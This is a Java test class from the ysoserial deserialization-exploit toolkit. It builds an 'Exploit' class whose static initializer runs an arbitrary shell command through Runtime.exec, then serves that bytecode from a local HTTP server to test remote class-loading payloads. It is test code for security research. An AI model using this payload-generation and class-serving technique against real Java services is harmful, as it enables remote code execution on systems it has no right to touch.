package ysoserial.test.payloads;


import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.Serializable;
import java.util.Random;
import java.util.concurrent.Callable;

import fi.iki.elonen.NanoHTTPD;
import fi.iki.elonen.NanoHTTPD.Response.Status;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import ysoserial.test.WrappedTest;


/**
 * @author mbechler
 *
 */
public class RemoteClassLoadingTest implements WrappedTest {

    int port;
    private String command;
    private String className;

    public RemoteClassLoadingTest ( String command ) {
        this.command = command;
        this.port = new Random().nextInt(65535-1024)+1024;
        this.className = "Exploit-" + System.currentTimeMillis();
    }


    public String getPayloadArgs () {
        return String.format("http://localhost:%d/", this.port) + ":" + this.className;
    }

    public int getHTTPPort () {
        return this.port;
    }

    public Callable<Object> createCallable ( Callable<Object> innerCallable ) {
        return new RemoteClassLoadingTestCallable(this.port, makePayloadClass(), innerCallable);
    }

    public String getExploitClassName () {
        return this.className;
    }

    protected byte[] makePayloadClass () {
        try {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(Exploit.class));
            final CtClass clazz = pool.get(Exploit.class.getName());
            clazz.setName(this.className);
            clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
            return clazz.toBytecode();
        }
        catch ( Exception e ) {
            e.printStackTrace();
            return new byte[0];
        }
    }

    static class RemoteClassLoadingTestCallable extends NanoHTTPD implements Callable<Object> {

        private Callable<Object> innerCallable;
        private byte[] data;
        private Object waitLock = new Object();


        public RemoteClassLoadingTestCallable ( int port, byte[] data, Callable<Object> innerCallable ) {
            super(port);
            this.data = data;
            this.innerCallable = innerCallable;

        }


        public void waitFor() throws InterruptedException {
            synchronized ( this.waitLock ) {
                this.waitLock.wait(1000);
            }
        }


        public Object call () throws Exception {
            try {
                setup();
                Object res = this.innerCallable.call();
                waitFor();
                Thread.sleep(1000);
                return res;
            }
            finally {
                cleanup();
            }

        }

        private void setup () throws IOException {
            start(NanoHTTPD.SOCKET_READ_TIMEOUT, false);
        }


        private void cleanup () {
            stop();
        }


        @Override
        public Response serve ( IHTTPSession sess ) {
            System.out.println("Serving " + sess.getUri());
            Response response = newFixedLengthResponse(Status.OK, "application/octet-stream", new ByteArrayInputStream(data), data.length);
            synchronized ( this.waitLock ) {
                this.waitLock.notify();
            }
            return response;
        }

    }



    public static class Exploit implements Serializable {

        private static final long serialVersionUID = 1L;

    }
}
